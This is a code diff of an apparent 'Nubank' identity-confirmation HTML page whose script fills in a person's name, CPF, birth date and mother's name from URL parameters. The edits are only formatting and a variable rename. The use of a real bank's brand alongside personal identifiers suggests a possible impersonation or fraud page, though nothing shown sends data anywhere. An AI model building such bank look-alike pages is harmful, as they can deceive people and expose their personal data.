@@ -3,7 +3,6 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-
   <title>Confirmação de Identidade - Nubank</title>
   <style>
     body {
@@ -111,23 +110,23 @@
     </div>
   </div>
 
-<script>
-  function getQueryParam(param) {
+  <script>
+    function getQueryParam(param) {
       const urlParams = new URLSearchParams(window.location.search);
       return urlParams.get(param);
     }
 
-     const nome = getQueryParam('nome');
-     const cpf = getQueryParam('cpf');
-     const datanasc = getQueryParam('datanasc');
-     const mae = getQueryParam('mae');
+    // Pegando as variáveis da URL
+    const nome = getQueryParam('nome');
+    const cpf = getQueryParam('cpf');
+    const nascimento = getQueryParam('datanasc');
+    const mae = getQueryParam('mae');
 
+    // Preenchendo os elementos da página
     if (nome) document.getElementById('nome').textContent = nome;
     if (cpf) document.getElementById('cpf').textContent = cpf;
-    if (datanasc) document.getElementById('nascimento').textContent = datanasc;
+    if (nascimento) document.getElementById('nascimento').textContent = nascimento;
     if (mae) document.getElementById('mae').textContent = mae;
-      
-    }
   </script>
 
 </body>
